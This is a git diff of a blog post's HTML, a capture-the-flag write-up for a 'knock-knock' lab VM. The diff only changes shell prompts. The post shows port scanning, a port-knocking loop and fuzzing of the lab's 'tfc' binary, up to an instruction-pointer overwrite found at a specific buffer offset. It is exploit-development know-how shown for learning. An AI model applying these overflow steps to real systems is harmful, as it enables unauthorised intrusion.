@@ -91,7 +91,7 @@
 
 <p>The name already gives a big hint. I supposed I had to deal with a port-knocking deamon like <code>knockd</code>. I opened the ova in VirtualBox and booted the virtual machine. I ran a ping scan with <code>nmap</code> and then a normal scan.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">~<span class="nv">$ </span>sudo nmap 10.8.7.101 -sS -p- -T4
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>sudo nmap 10.8.7.101 -sS -p- -T4
 Starting Nmap 6.00 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 21:27 CEST
 
 Nmap scan report <span class="k">for</span> 10.8.7.101
@@ -139,7 +139,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 
 <p>Probably not the most elegant way of doing it, but I was still in a CTF mindset ;) I ran the script and then <code>nmap</code> again, but found that nothing had happened! What could be going on here? I tried to debug script a bit, added the try/except blocks to make it robust, but I couldn&rsquo;t figure out why it wasn&rsquo;t working. Maybe not all of the knocks were getting through? I decided to run the script continuously:</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">~<span class="nv">$ </span><span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span> python ./knock.py<span class="p">;</span> <span class="k">done</span>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span><span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">do</span> python ./knock.py<span class="p">;</span> <span class="k">done</span>
 port: 37586
 port: 25290
 port: 48122
@@ -153,7 +153,7 @@ port: 55993
 
 <p>After a while, I ran <code>nmap</code> for the umpthieth time and lo and behold, <code>ssh</code> and <code>http</code> were open!</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">~<span class="nv">$ </span>sudo nmap 10.8.7.101 -sS -T4 -p1-100
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>sudo nmap 10.8.7.101 -sS -T4 -p1-100
 
 Starting Nmap 6.00 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-14 21:35 CEST
 Nmap scan report <span class="k">for</span> 10.8.7.101
@@ -173,7 +173,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 
 <p>Not much was on that webpage, not even in the source. I grabbed the image and poked at it using stego tools such as <code>stepic</code> and <code>outguess</code>, which came up negative. A quick <code>strings</code> on the jpg revealed something much more interesting:</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">~<span class="nv">$ </span>strings knockknock.jpg
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>strings knockknock.jpg
 &lt;snip&gt;
 <span class="nv">CN</span><span class="o">=</span>i
 <span class="se">\,</span>mk
@@ -218,9 +218,9 @@ Segmentation fault</code></pre></div>
 
 <p>Well, well, well, a segfault! This looked promising. Unfortunately, <code>gdb</code> was not installed on this VM, so I transferred the binary over to my box and repeated the process.</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">~/tmp/knockknock<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*10000&#39;</span> &gt; in.tfc
-~/tmp/knockknock<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
-~/tmp/knockknock<span class="nv">$ </span>./tfc in.tfc out.tfc
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*10000&#39;</span> &gt; in.tfc
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc in.tfc out.tfc
 Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 
 bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
@@ -318,11 +318,11 @@ gdb-peda<span class="err">$</span></code></pre></div>
 
 <p>Like I said, a CTF mindset and some very ugly Python code, but I was now able to encode my payload. I gave it a spin:</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">~/tmp/knockknock<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*5000&#39;</span> &gt; in.tfc
-~/tmp/knockknock<span class="nv">$ </span>python ./enc.py
-~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc bleh.tfc
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*5000&#39;</span> &gt; in.tfc
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python ./enc.py
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc bleh.tfc
 Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
-~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
 GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
 &lt;snip&gt;
 Core was generated by <span class="s1">&#39;./tfc out2.tfc bleh.tfc&#39;</span>.
@@ -333,10 +333,10 @@ gdb-peda<span class="err">$</span></code></pre></div>
 
 <p>Yeah! I was able to overwrite <code>eip</code>! I narrowed down the buffer and determined which part was responsible for overwriting <code>eip</code> by trial-and-error and looking at the stack in the coredump. I finally found:</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">~<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*4124+&quot;B&quot;*4+&quot;C&quot;*4&#39;</span> &gt; in.tfc <span class="o">&amp;&amp;</span> python ./enc.py 
-~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc bleh.tfc
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*4124+&quot;B&quot;*4+&quot;C&quot;*4&#39;</span> &gt; in.tfc <span class="o">&amp;&amp;</span> python ./enc.py 
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc bleh.tfc
 Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
-~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
 GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
 &lt;snip&gt;
 Program terminated with signal 11, Segmentation fault.
@@ -348,7 +348,7 @@ NX        : disabled
 PIE       : disabled
 RELRO     : disabled
 gdb-peda<span class="nv">$ </span>q
-~/tmp/knockknock<span class="nv">$ </span>readelf -l tfc
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>readelf -l tfc
 
 Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
 Entry point 0x8048500
